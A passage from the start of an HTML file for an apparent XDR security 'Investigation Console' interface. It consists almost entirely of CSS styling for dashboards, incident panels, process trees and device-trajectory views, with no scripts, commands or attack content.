<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>NivXRay ONE XDR — Investigation Console</title>
<style>
:root{
  --bg:#0A0C11;
  --bg2:#0D1016;
  --panel:#11141C;
  --panel2:#0E1119;
  --border:#212736;
  --border-soft:#191E2A;
  --text:#E7E9EF;
  --text-dim:#B4B9C6;
  --muted:#78808F;
  --faint:#4A5162;
  --purple:#9B7BF0;
  --purple-dim:#2A2145;
  --mint:#3CE8B8;
  --cyan:#3FC1E8;
  --amber:#F5A623;
  --red:#EF5B5B;
  --red-dim:#331A1D;
  --yellow:#E8C547;
  --green:#4ED890;
  --radius:6px;
  --mono:'IBM Plex Mono','SFMono-Regular',Consolas,monospace;
  --sans:'Inter','Segoe UI',system-ui,sans-serif;
}
*{box-sizing:border-box;}
html,body{margin:0;padding:0;height:100%;background:var(--bg);color:var(--text);font-family:var(--sans);font-size:12.5px;-webkit-font-smoothing:antialiased;}
a{color:inherit;text-decoration:none;}
button{font-family:inherit;cursor:pointer;}
::-webkit-scrollbar{width:9px;height:9px;}
::-webkit-scrollbar-thumb{background:#1c2230;border-radius:5px;}
::-webkit-scrollbar-track{background:transparent;}

#app{display:flex;flex-direction:column;height:100vh;}
#topbar{height:46px;flex:0 0 46px;display:flex;align-items:center;gap:0;padding:0 14px;background:var(--panel2);border-bottom:1px solid var(--border);position:relative;z-index:80;}
.brand{display:flex;align-items:center;gap:7px;font-weight:800;letter-spacing:.3px;font-size:13.5px;padding-right:16px;}
.brand .mark{width:20px;height:20px;border-radius:5px;background:linear-gradient(135deg,var(--purple),var(--cyan));display:flex;align-items:center;justify-content:center;color:#0A0C11;font-weight:900;font-size:11px;}
.topnav{display:flex;gap:2px;height:100%;}
.topnav .t{display:flex;align-items:center;padding:0 12px;font-size:12px;color:var(--muted);font-weight:600;border-bottom:2px solid transparent;cursor:pointer;}
.topnav .t.active{color:var(--text);border-bottom-color:var(--purple);}
.topnav .t:hover{color:var(--text-dim);}
.search-wrap{flex:1;max-width:460px;margin-left:18px;display:flex;align-items:center;gap:7px;background:var(--panel);border:1px solid var(--border);border-radius:5px;padding:5px 9px;color:var(--muted);}
.search-wrap input{background:none;border:none;outline:none;color:var(--text);font-size:12px;width:100%;}
.top-actions{margin-left:auto;display:flex;align-items:center;gap:12px;}
.icon-btn{width:28px;height:28px;border-radius:5px;background:transparent;color:var(--muted);display:flex;align-items:center;justify-content:center;position:relative;font-size:13px;}
.icon-btn:hover{background:var(--panel);color:var(--text);}
.notif-dot{position:absolute;top:4px;right:4px;width:6px;height:6px;border-radius:50%;background:var(--red);border:1.5px solid var(--panel2);}
.tier-pill{font-size:10.5px;color:var(--text-dim);background:var(--panel);border:1px solid var(--border);border-radius:5px;padding:5px 9px;}
.user-chip{width:26px;height:26px;border-radius:50%;background:#1a2028;border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:800;color:var(--purple);}

#body{flex:1;display:flex;min-height:0;}
#sidebarNav{width:198px;flex:0 0 198px;background:var(--panel2);border-right:1px solid var(--border);overflow-y:auto;padding:10px 0 20px;}
.nav-title{font-size:9.5px;letter-spacing:1.1px;color:var(--faint);text-transform:uppercase;padding:13px 14px 5px;font-weight:800;}
.nav-item{display:flex;align-items:center;gap:8px;padding:6px 14px;color:var(--text-dim);font-size:12px;border-left:2px solid transparent;}
.nav-item .ic{width:12px;text-align:center;color:var(--faint);font-size:11px;}
.nav-item:hover{background:var(--panel);color:var(--text);}
.nav-item.active{background:var(--purple-dim);color:var(--purple);border-left-color:var(--purple);}
.nav-item.active .ic{color:var(--purple);}

#main{flex:1;overflow-y:auto;min-width:0;background:var(--bg);}
.page{padding:18px 22px 60px;max-width:1520px;margin:0 auto;}
.page-header{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:14px;}
.page-header h1{font-size:16.5px;margin:0;font-weight:700;}
.page-sub{color:var(--muted);font-size:11.5px;margin-top:2px;}

.stat-grid{display:grid;grid-template-columns:repeat(8,1fr);gap:8px;margin-bottom:16px;}
.stat-card{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:10px 11px;border-top:2px solid var(--accent,var(--purple));}
.stat-card .lbl{font-size:9.5px;color:var(--muted);text-transform:uppercase;letter-spacing:.3px;margin-bottom:6px;}
.stat-card .val{font-size:20px;font-weight:800;font-family:var(--mono);}
.stat-card.crit{--accent:var(--red);} .stat-card.crit .val{color:var(--red);}
.stat-card.high{--accent:var(--amber);} .stat-card.high .val{color:var(--amber);}
.stat-card.info{--accent:var(--cyan);} .stat-card.info .val{color:var(--cyan);}
.stat-card.ok{--accent:var(--mint);} .stat-card.ok .val{color:var(--mint);}
.stat-card.na{--accent:var(--border);opacity:.6;border-top-style:dashed;} .stat-card.na .val{color:var(--faint);}
.stat-card.na .trend{font-size:9px;color:var(--faint);margin-top:4px;}
.stat-card.kpi-clickable{cursor:pointer;}
.stat-card.kpi-clickable:hover{border-color:var(--accent,var(--purple));background:#141a24;}

.panel{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);margin-bottom:16px;}
.panel-head{display:flex;align-items:center;justify-content:space-between;padding:10px 13px;border-bottom:1px solid var(--border);}
.panel-head h3{margin:0;font-size:11.5px;font-weight:700;letter-spacing:.2px;text-transform:uppercase;color:var(--text-dim);}
.link-more{font-size:11px;color:var(--cyan);}

table{width:100%;border-collapse:collapse;font-size:11.8px;}
th{text-align:left;color:var(--faint);font-weight:700;font-size:9.8px;text-transform:uppercase;letter-spacing:.4px;padding:7px 9px;border-bottom:1px solid var(--border);white-space:nowrap;}
td{padding:8px 9px;border-bottom:1px solid var(--border-soft);color:var(--text-dim);vertical-align:middle;}
tr.rowlink{cursor:pointer;}
tr.rowlink:hover td{background:#141a24;color:var(--text);}
.mono{font-family:var(--mono);}

.badge{display:inline-block;padding:2px 7px;border-radius:3px;font-size:10px;font-weight:800;letter-spacing:.2px;}
.sev-critical{background:var(--red-dim);color:#ff9494;}
.sev-high{background:#3A2A0E;color:var(--amber);}
.sev-medium{background:#3A330E;color:var(--yellow);}
.sev-low{background:#123527;color:var(--mint);}
.status-pill{font-size:10px;padding:2px 7px;border-radius:3px;background:#1a2028;color:var(--text-dim);border:1px solid var(--border);}

.dom-badge{display:inline-block;padding:1px 6px;margin:1px 2px 1px 0;border-radius:3px;font-size:9px;font-weight:800;background:#171e2b;color:var(--cyan);border:1px solid #232e40;cursor:pointer;}
.dom-badge:hover{background:#1b2536;}

.pivot-wrap{position:relative;display:inline-block;}
.pivot-anchor{cursor:pointer;border-bottom:1px dotted var(--faint);}
.pivot-anchor:hover{border-bottom-color:var(--cyan);color:var(--cyan);}
.pivot-menu{position:absolute;left:0;top:100%;margin-top:4px;background:#10141c;border:1px solid var(--border);border-radius:6px;min-width:170px;z-index:120;box-shadow:0 10px 26px rgba(0,0,0,.55);display:none;}
.pivot-menu.open{display:block;}
.pivot-menu .pi{padding:7px 11px;font-size:11px;color:var(--text-dim);border-bottom:1px solid var(--border-soft);}
.pivot-menu .pi:last-child{border-bottom:none;}
.pivot-menu .pi:hover{background:#182130;color:var(--text);}

.inc-header{background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:14px 16px;margin-bottom:12px;}
.inc-top{display:flex;justify-content:space-between;align-items:flex-start;gap:20px;}
.inc-id{font-family:var(--mono);color:var(--muted);font-size:11px;margin-bottom:5px;}
.inc-title{font-size:16px;font-weight:700;margin-bottom:8px;}
.inc-meta{display:flex;flex-wrap:wrap;gap:16px;margin-top:8px;}
.inc-meta .m{font-size:11px;}
.inc-meta .m .k{color:var(--faint);display:block;font-size:9.5px;text-transform:uppercase;letter-spacing:.3px;margin-bottom:2px;}
.inc-meta .m .v{color:var(--text-dim);font-family:var(--mono);}
.tag-pill{display:inline-block;background:#151b26;border:1px solid var(--border);color:var(--text-dim);font-size:10px;padding:2px 7px;border-radius:3px;margin-right:4px;}
.inc-badges{display:flex;gap:8px;align-items:center;margin-top:6px;flex-wrap:wrap;}
.state-pill-lg{font-size:10.5px;font-weight:800;padding:3px 10px;border-radius:20px;border:1px solid;letter-spacing:.3px;}
.hold-banner{margin-top:12px;background:#1a1710;border:1px solid #4a3a15;border-radius:6px;padding:11px 14px;}
.hold-title{color:var(--amber);font-weight:800;font-size:11.5px;margin-bottom:8px;}
.hold-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:8px 16px;}
.hold-grid .k{color:var(--faint);display:block;font-size:9.5px;text-transform:uppercase;letter-spacing:.3px;margin-bottom:2px;}
.hold-grid .v{color:var(--text-dim);font-size:11.5px;}

.hdr-actions{display:flex;gap:8px;align-items:flex-start;position:relative;}
.btn{background:var(--panel2);border:1px solid var(--border);color:var(--text-dim);padding:7px 11px;border-radius:5px;font-size:11px;font-weight:700;}
.btn:hover{border-color:var(--purple);color:var(--text);}
.btn.primary{background:var(--purple);color:#12081F;border:none;}
.btn.small{padding:5px 9px;font-size:10.5px;}

.actions-menu{position:absolute;right:0;top:calc(100% + 6px);width:230px;background:#10141c;border:1px solid var(--border);border-radius:7px;box-shadow:0 14px 34px rgba(0,0,0,.55);z-index:100;overflow:hidden;display:none;max-height:70vh;overflow-y:auto;}
.actions-menu.open{display:block;}
.actions-menu .grp-title{font-size:9.5px;text-transform:uppercase;letter-spacing:.4px;color:var(--faint);padding:8px 11px 3px;background:#0c1017;}
.actions-menu .a-item{padding:7px 11px;font-size:11.5px;color:var(--text-dim);border-top:1px solid var(--border-soft);}
.actions-menu .a-item:hover{background:#171e2b;color:var(--text);}
.actions-menu .a-item.danger:hover{color:#ff8b8b;}

.tabbar{display:flex;gap:1px;overflow-x:auto;background:var(--panel2);border:1px solid var(--border);border-radius:var(--radius) var(--radius) 0 0;padding:0 4px;}
.tabbtn{padding:10px 12px;font-size:11.3px;color:var(--muted);white-space:nowrap;border-bottom:2px solid transparent;font-weight:700;}
.tabbtn:hover{color:var(--text-dim);}
.tabbtn.active{color:var(--purple);border-bottom-color:var(--purple);}
.tabpanel{background:var(--panel);border:1px solid var(--border);border-top:none;border-radius:0 0 var(--radius) var(--radius);padding:16px;min-height:420px;}

.progression{display:flex;align-items:center;margin:6px 0 16px;overflow-x:auto;}
.stage{display:flex;flex-direction:column;align-items:center;gap:5px;min-width:92px;cursor:pointer;padding:3px;}
.stage .dot{width:24px;height:24px;border-radius:50%;background:#171e2b;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:10px;color:var(--muted);}
.stage.hit .dot{border-color:var(--red);color:var(--red);background:#241416;}
.stage .lbl{font-size:10px;color:var(--text-dim);text-align:center;}
.stage-arrow{flex:1;height:2px;background:var(--border);min-width:16px;margin:0 2px;position:relative;top:-12px;}

.domain-cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:8px;}
.dcard{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 12px;}
.dcard .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;}
.dcard .name{font-weight:800;font-size:11px;color:var(--cyan);letter-spacing:.3px;}
.dcard .count{font-family:var(--mono);font-size:17px;font-weight:800;}
.dcard .deepdive{font-size:10.5px;color:var(--purple);font-weight:700;margin-top:4px;}

/* incident sub-nav (Investigation subtabs / Forge EDR inner subnav) */
.subnav{display:flex;gap:1px;overflow-x:auto;background:#0d1119;border:1px solid var(--border);border-top:none;padding:0 4px;}
.subtabbtn{padding:8px 11px;font-size:10.5px;color:var(--faint);white-space:nowrap;border-bottom:2px solid transparent;font-weight:700;cursor:pointer;}
.subtabbtn:hover{color:var(--text-dim);}
.subtabbtn.active{color:var(--mint);border-bottom-color:var(--mint);}
.subtabbtn.secondary{color:#3a4454;}
.subtabbtn.secondary:hover{color:var(--faint);}

/* domain workspace breadcrumb (replaces tabbar when viewing a scoped domain) */
.domain-crumb{background:var(--panel2);border:1px solid var(--border);border-top:none;padding:9px 13px;font-size:11px;color:var(--text-dim);display:flex;align-items:center;gap:8px;flex-wrap:wrap;}
.db-back{color:var(--cyan);cursor:pointer;font-weight:700;}
.db-back:hover{text-decoration:underline;}
.db-sep{color:var(--faint);}
.db-arrow{color:var(--faint);}
.db-current{color:var(--purple);font-weight:800;}
.dom-ctx{background:var(--panel);border:1px solid var(--border);border-top:none;padding:12px 14px;}
.dom-ctx-title{font-size:14px;font-weight:800;margin-bottom:8px;}
.dom-ctx-row{display:flex;flex-wrap:wrap;gap:16px;}
.dom-ctx-item{font-size:11px;display:flex;flex-direction:column;gap:2px;}
.dom-ctx-item .k{color:var(--faint);font-size:9.5px;text-transform:uppercase;letter-spacing:.3px;}
.dom-ctx-item .v{color:var(--text-dim);}
.scope-toggle{display:flex;gap:6px;margin-top:10px;}
.scope-opt{font-size:10.5px;padding:5px 11px;border-radius:20px;background:var(--panel2);border:1px solid var(--border);color:var(--muted);cursor:pointer;font-weight:700;}
.scope-opt.on{color:var(--purple);border-color:var(--purple);background:var(--purple-dim);}
.scope-unavailable{margin-top:8px;font-size:10.5px;color:var(--faint);background:var(--panel2);border:1px dashed var(--border);border-radius:5px;padding:7px 10px;}

/* Incident Evidence Across Domains */
.edom-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:10px;}
.edom-card{background:var(--panel2);border:1px solid var(--border);border-left:3px solid var(--border);border-radius:6px;padding:11px 13px;}
.edom-card.related{border-left-color:var(--cyan);}
.edom-card.searched{border-left-color:var(--faint);opacity:.88;}
.edom-card.notconnected{border-left-color:var(--faint);border-style:dashed;opacity:.7;}
.edom-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:7px;}
.edom-name{font-weight:800;font-size:10.5px;color:var(--cyan);letter-spacing:.3px;}
.edom-card.searched .edom-name, .edom-card.notconnected .edom-name{color:var(--muted);}
.edom-count{font-family:var(--mono);font-size:18px;font-weight:800;}
.edom-bullets{margin:0 0 8px;padding-left:15px;font-size:10.8px;color:var(--text-dim);line-height:1.6;}
.edom-searched-meta{font-size:10.3px;color:var(--muted);margin-bottom:7px;line-height:1.6;}
.edom-why{font-size:10.5px;color:var(--text-dim);line-height:1.5;margin-bottom:9px;}
.edom-why b{color:var(--cyan);}
.edom-why.muted{color:var(--muted);}
.edom-why.muted b{color:var(--muted);}
.edom-open{font-size:10.3px;color:var(--purple);font-weight:800;cursor:pointer;}
.edom-open:hover{text-decoration:underline;}
.edom-open.muted{color:var(--faint);}
.edom-open.muted:hover{color:var(--muted);}

.section-title{font-size:10.3px;text-transform:uppercase;letter-spacing:.5px;color:var(--faint);font-weight:800;margin:18px 0 8px;}
.section-title:first-child{margin-top:0;}

.split{display:grid;grid-template-columns:1.4fr 1fr;gap:14px;}
.ptree{font-family:var(--mono);font-size:11.5px;line-height:2.05;}
.ptree .node{display:inline-flex;align-items:center;gap:8px;background:var(--panel2);border:1px solid var(--border);border-radius:5px;padding:4px 9px;cursor:pointer;}
.ptree .node:hover{border-color:var(--cyan);}
.ptree .node.mal{border-color:var(--red);color:#ff9d9d;}
.ptree .node.sel{border-color:var(--purple);box-shadow:0 0 0 1px var(--purple) inset;}
.ptree .arrow{color:var(--faint);margin:0 4px;}
.indent{margin-left:22px;}
.indent2{margin-left:44px;}
.indent3{margin-left:66px;}

.kv-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:8px;}
.kv{background:var(--panel2);border:1px solid var(--border-soft);border-radius:5px;padding:8px 10px;}
.kv .k{font-size:9px;text-transform:uppercase;letter-spacing:.3px;color:var(--faint);margin-bottom:3px;}
.kv .v{font-family:var(--mono);font-size:11.3px;color:var(--text-dim);}

.detail-panel{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:12px 13px;}
.detail-panel h4{margin:0 0 8px;font-size:10.5px;text-transform:uppercase;letter-spacing:.4px;color:var(--purple);}
.dl-row{display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid var(--border-soft);font-size:11.3px;}
.dl-row .k{color:var(--faint);}
.dl-row .v{font-family:var(--mono);color:var(--text-dim);text-align:right;}
.mitre-chip{display:inline-block;background:#1b1430;border:1px solid #362559;color:#c9b3ff;font-size:9.5px;padding:2px 6px;border-radius:3px;margin:2px 2px 0 0;font-family:var(--mono);}

.evrow{cursor:pointer;}
.toolbar{display:flex;gap:7px;margin-bottom:10px;flex-wrap:wrap;}

.netmap{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:18px;display:flex;align-items:center;justify-content:center;}
.netnode{display:flex;flex-direction:column;align-items:center;gap:5px;padding:9px 14px;background:#0d1016;border:1px solid var(--border);border-radius:6px;cursor:pointer;min-width:112px;text-align:center;}
.netnode:hover{border-color:var(--cyan);}
.netnode .tag{font-size:8.5px;color:var(--faint);text-transform:uppercase;}
.netnode .name{font-family:var(--mono);font-size:11px;color:var(--text);}
.netnode.bad{border-color:var(--red);} .netnode.bad .name{color:#ff9d9d;}
.netline{flex:0 0 50px;height:2px;background:linear-gradient(90deg,var(--border),var(--red));position:relative;}
.netline::after{content:"C2";position:absolute;top:-15px;left:50%;transform:translateX(-50%);font-size:8.5px;color:var(--red);font-weight:800;}

.exppath{display:flex;flex-direction:column;max-width:400px;margin:8px auto;}
.expnode{background:var(--panel2);border:1px solid var(--border);border-left:3px solid var(--cyan);border-radius:5px;padding:9px 13px;font-size:11.5px;}
.expnode.crit{border-left-color:var(--red);color:#ff9d9d;}
.exparrow{text-align:center;color:var(--faint);font-size:13px;padding:1px;}

/* device trajectory */
.traj{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:14px;overflow-x:auto;}
.traj-toolbar{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;}
.traj-lanes{display:grid;grid-template-columns:90px 1fr;row-gap:4px;min-width:900px;}
.lane-label{font-size:9.5px;color:var(--faint);text-transform:uppercase;letter-spacing:.4px;display:flex;align-items:center;padding-right:8px;border-right:1px solid var(--border-soft);}
.lane-track{position:relative;height:34px;border-bottom:1px solid var(--border-soft);}
.traj-marker{position:absolute;top:6px;width:10px;height:10px;border-radius:50%;background:var(--cyan);cursor:pointer;transform:translateX(-50%);}
.traj-marker.crit{background:var(--red);}
.traj-marker:hover{outline:2px solid var(--purple);outline-offset:2px;}
.traj-axis{grid-column:1/-1;display:flex;justify-content:space-between;font-family:var(--mono);font-size:9.5px;color:var(--faint);padding:4px 0 0 98px;}

/* whole-device trajectory */
.tj-toolbar{display:flex;gap:12px;flex-wrap:wrap;align-items:center;margin-bottom:10px;}
.tj-grp{display:flex;gap:4px;}
.tj-nav{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:8px 12px;margin-bottom:8px;}
.dn-strip{display:flex;gap:4px;align-items:flex-end;border-bottom:1px solid var(--border-soft);padding-bottom:8px;margin-bottom:6px;}
.dn-month{font-size:9px;color:var(--faint);font-weight:800;margin-right:6px;letter-spacing:1px;}
.dn-day{display:flex;flex-direction:column;align-items:center;gap:2px;padding:2px 5px;border-radius:4px;cursor:pointer;position:relative;}
.dn-day:hover{background:#171e2b;}
.dn-day.inwin{background:var(--purple-dim);}
.dn-lbl{font-family:var(--mono);font-size:9.5px;color:var(--muted);}
.dn-dot{width:7px;height:7px;border-radius:50%;}
.dn-inc{position:absolute;top:100%;font-size:7.5px;color:var(--red);font-weight:800;white-space:nowrap;}
.hn-strip{display:flex;gap:2px;align-items:flex-end;height:22px;padding-top:8px;}
.hn-cell{flex:1;display:flex;align-items:flex-end;cursor:pointer;height:100%;}
.hn-cell:hover .hn-bar{outline:1px solid var(--purple);}
.hn-bar{width:100%;border-radius:1px 1px 0 0;}
.tj-board{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:10px 12px;overflow-x:auto;}
.tj-head{display:flex;justify-content:space-between;font-size:9.5px;color:var(--muted);margin-bottom:8px;gap:10px;}
.tj-lanes{display:grid;grid-template-columns:90px 1fr;row-gap:2px;position:relative;min-width:640px;}
.tj-lane-lbl{font-size:9px;color:var(--faint);text-transform:uppercase;letter-spacing:.4px;display:flex;align-items:center;padding-right:8px;border-right:1px solid var(--border-soft);cursor:pointer;font-weight:800;}
.tj-lane-lbl:hover{color:var(--text-dim);}
.tj-lane-lbl.off{opacity:.3;text-decoration:line-through;}
.tj-lane-track{position:relative;height:30px;border-bottom:1px solid var(--border-soft);}
.tj-mark{position:absolute;top:9px;width:9px;height:9px;border-radius:50%;cursor:pointer;transform:translateX(-50%);}
.tj-mark:hover{outline:1.5px solid var(--purple);outline-offset:1px;}
.tj-mark.sel{outline:2px solid var(--purple);outline-offset:1px;}
.tj-incline{position:absolute;top:0;bottom:0;width:1.5px;background:var(--red);opacity:.55;z-index:1;pointer-events:none;}

/* ===== device page trajectory (node graph) ===== */
.dev-crumb{font-size:10px;color:var(--faint);margin-bottom:8px;}
.dev-head{display:flex;justify-content:space-between;align-items:center;gap:14px;background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:11px 14px;margin-bottom:8px;flex-wrap:wrap;}
.dev-id{display:flex;gap:11px;align-items:center;}
.dev-oslogo{width:34px;height:34px;border-radius:6px;background:#151b26;border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:17px;color:var(--cyan);}
.dev-name{font-size:15px;font-weight:800;}
.dev-online{font-size:10px;color:var(--mint);font-weight:700;margin-left:6px;}
.dev-sub{font-size:10.5px;color:var(--muted);margin-top:2px;}
.dev-stats{display:flex;gap:0;align-items:center;flex-wrap:wrap;}
.dev-stat{padding:0 16px;border-left:1px solid var(--border-soft);}
.dev-stat:first-child{border-left:none;}
.dev-stat .k{font-size:9px;color:var(--faint);text-transform:uppercase;letter-spacing:.3px;margin-bottom:2px;}
.dev-stat .v{font-size:12px;color:var(--text-dim);}
.dev-stats .btn.primary{margin-left:14px;background:var(--mint);color:#04120D;}
.dev-tabs{display:flex;gap:1px;border-bottom:1px solid var(--border);margin-bottom:10px;overflow-x:auto;}
.dev-tab{padding:8px 12px;font-size:11px;color:var(--muted);font-weight:700;border-bottom:2px solid transparent;white-space:nowrap;cursor:pointer;}
.dev-tab:hover{color:var(--text-dim);}
.dev-tab.active{color:var(--mint);border-bottom-color:var(--mint);background:#0f1a17;border-radius:5px 5px 0 0;}
/* density strip */
.dsx{margin:10px 0 6px;}
.dsx-bars{position:relative;display:flex;align-items:flex-end;gap:1.5px;height:34px;padding-bottom:2px;}
.dsx-bar{flex:1;border-radius:1px 1px 0 0;min-width:2px;}
.dsx-comp{position:absolute;top:-4px;bottom:0;background:rgba(245,166,35,.12);border:1px solid rgba(245,166,35,.6);border-radius:3px;}
.dsx-comp-lbl{position:absolute;top:calc(100% + 4px);left:50%;transform:translateX(-50%);background:#1c1408;border:1px solid rgba(245,166,35,.5);color:var(--amber);font-size:8.5px;font-weight:800;padding:3px 8px;border-radius:4px;white-space:nowrap;text-align:center;line-height:1.5;z-index:5;}
.dsx-axis{display:flex;justify-content:space-between;font-family:var(--mono);font-size:8.5px;color:var(--faint);border-top:1px solid var(--border-soft);padding-top:3px;margin-top:22px;}
/* node graph — three-pane: inventory | canvas | details */
.tj3{display:grid;grid-template-columns:1fr 330px;gap:10px;align-items:start;}
.tj3-left{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:0 0 8px;min-width:0;overflow:hidden;}
.tj3-paneh{display:flex;justify-content:space-between;align-items:center;font-size:10px;font-weight:800;letter-spacing:.5px;padding:9px 12px;border-bottom:1px solid var(--border);color:var(--text-dim);}
.tj3-grid{position:relative;display:grid;grid-template-columns:228px 1fr;max-height:460px;overflow-y:auto;}
.ti-head{grid-column:1;display:flex;align-items:center;font-size:9px;font-weight:800;letter-spacing:.6px;color:var(--faint);padding:0 10px;background:#0c1017;border-bottom:1px solid var(--border-soft);border-right:1px solid var(--border-soft);}
.tc-headrow{grid-column:2;background:#0c1017;border-bottom:1px solid var(--border-soft);}
.ti-row{grid-column:1;display:flex;align-items:center;gap:7px;padding:0 10px;border-bottom:1px solid var(--border-soft);border-right:1px solid var(--border-soft);cursor:pointer;min-width:0;}
.ti-row:hover{background:#141a24;}
.ti-row.sel{background:var(--purple-dim);}
.ti-ic{font-size:11px;flex-shrink:0;}
.ti-lbl{font-size:10.5px;color:var(--text-dim);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;flex:1;}
.ti-row.sel .ti-lbl{color:var(--text);}
.ti-sev{font-size:8.3px;font-weight:800;flex-shrink:0;}
.tc-row{grid-column:2;position:relative;border-bottom:1px solid var(--border-soft);cursor:default;}
.tc-row.sel{background:rgba(155,123,240,.06);}
.tc-mark{position:absolute;top:50%;transform:translate(-50%,-50%);width:11px;height:11px;border-radius:50%;cursor:pointer;z-index:3;border:2px solid #0d1016;}
.tc-mark:hover{box-shadow:0 0 0 3px rgba(155,123,240,.35);}
.tc-mark.sel{box-shadow:0 0 0 3px rgba(155,123,240,.6);}
.tc-mark.dim{opacity:.3;}
.tc-time{position:absolute;top:50%;transform:translateY(-50%);font-size:8.8px;color:var(--faint);white-space:nowrap;z-index:2;pointer-events:none;}
.tc-time.dim{opacity:.3;}
.tj-compband{position:absolute;top:0;bottom:0;background:rgba(245,166,35,.07);border-left:1px solid rgba(245,166,35,.45);border-right:1px solid rgba(245,166,35,.45);z-index:1;pointer-events:none;}
.tj-svg2{position:absolute;top:0;left:228px;width:calc(100% - 228px);z-index:1;pointer-events:none;}
.tj-edge{fill:none;stroke:#3a4454;stroke-width:1.2;}
.tj-edge.dim{opacity:.18;}
.tj-axis2{display:flex;justify-content:space-between;font-size:8.8px;color:var(--faint);border-top:1px solid var(--border-soft);padding:4px 12px 0;margin-top:0;}
.tj-legend{display:flex;gap:16px;flex-wrap:wrap;font-size:10px;color:var(--muted);border-top:1px solid var(--border-soft);margin:8px 12px 0;padding-top:8px;}
.tj-lgic{font-size:11px;}
.tj-main{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:11px 13px;min-width:0;}
.tj-title{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:800;letter-spacing:.5px;margin-bottom:9px;}
/* activity details */
.tj-details{background:var(--panel2);border:1px solid var(--border);border-radius:6px;position:sticky;top:10px;}
.ad-title{display:flex;justify-content:space-between;align-items:center;font-size:10.5px;font-weight:800;letter-spacing:.5px;padding:11px 13px;border-bottom:1px solid var(--border);}
.ad-x{cursor:pointer;color:var(--muted);font-weight:600;}
.ad-hero{display:flex;gap:10px;align-items:center;padding:12px 13px 8px;}
.ad-heroic{width:38px;height:38px;border-radius:50%;background:#1c0d0f;border:2px solid;display:flex;align-items:center;justify-content:center;font-size:17px;}
.ad-name{font-size:14px;font-weight:800;}
.ad-sub{font-size:10.5px;color:var(--muted);margin-top:2px;}
.ad-tabs{display:flex;border-bottom:1px solid var(--border);padding:0 8px;}
.ad-tab{padding:7px 8px;font-size:10px;font-weight:700;color:var(--faint);cursor:pointer;border-bottom:2px solid transparent;}
.ad-tab.active{color:var(--mint);border-bottom-color:var(--mint);}
.ad-body{padding:9px 13px;max-height:430px;overflow-y:auto;}
.ad-row{display:flex;justify-content:space-between;gap:12px;padding:4.5px 0;border-bottom:1px solid var(--border-soft);font-size:10.8px;align-items:baseline;}
.ad-row .k{color:var(--faint);flex-shrink:0;}
.ad-row .v{color:var(--text-dim);text-align:right;word-break:break-word;}
.ad-cmd{background:#0a0d12;border:1px solid var(--border);border-radius:5px;padding:8px 9px;font-size:9.8px;color:var(--text-dim);word-break:break-all;width:100%;}
.ad-sb{display:inline-block;width:9px;height:11px;margin-right:2px;border-radius:1px;vertical-align:middle;}
.ad-chip{display:inline-block;background:#0f2620;border:1px solid #235142;color:var(--mint);font-size:9.3px;font-weight:700;padding:2px 8px;border-radius:10px;margin:2px 3px 0 0;}
.ad-actions{display:flex;gap:7px;padding:11px 13px;border-top:1px solid var(--border);flex-wrap:wrap;}

/* ===== three-pane trajectory ===== */
.tj-topbar{display:flex;gap:14px;flex-wrap:wrap;align-items:center;margin-bottom:8px;}
.tj-grp2{display:flex;gap:4px;flex-wrap:wrap;}
.tj3{display:grid;grid-template-columns:236px 1fr 348px;gap:10px;align-items:start;}
.tj-inv{background:var(--panel2);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
.tj-inv-head{display:flex;justify-content:space-between;align-items:center;padding:9px 11px;border-bottom:1px solid var(--border);font-size:10px;font-weight:800;letter-spacing:.5px;}
.tj-inv-body{max-height:520px;overflow-y:auto;padding:4px 0 8px;}
.inv-grp{font-size:9px;font-weight:800;letter-spacing:.5px;color:var(--faint);padding:9px 11px 4px;}
.inv-item{display:flex;align-items:center;gap:7px;padding:5px 11px;cursor:pointer;font-size:11px;color:var(--text-dim);}
.inv-item:hover{background:#141a24;color:var(--text);}
.inv-item.sel{background:var(--purple-dim);color:var(--purple);}
.inv-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
.inv-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:var(--mono);font-size:10.5px;}
.inv-meta{font-size:9px;color:var(--faint);flex-shrink:0;}
.tj-canvas-wrap{background:var(--panel2);border:1px solid var(--border);border-radius:6px;padding:9px 11px;min-width:0;}
.tj-canvas-head{display:flex;justify-content:space-between;font-size:9.5px;color:var(--muted);margin-bottom:6px;gap:8px;}
.tj-canvas{position:relative;overflow:hidden;border-top:1px solid var(--border-soft);}
.tjr-grp{position:absolute;left:0;right:0;display:flex;align-items:flex-end;font-size:9px;font-weight:800;letter-spacing:.5px;color:var(--faint);padding:0 0 2px 2px;border-bottom:1px solid var(--border-soft);background:linear-gradient(180deg,transparent,rgba(155,123,240,.03));}
.tjr-row{position:absolute;left:0;right:0;border-bottom:1px solid #141a24;transition:opacity .12s;}
.tjr-row:hover{background:#12181f;}
.tjr-row.sel{background:rgba(155,123,240,.08);}
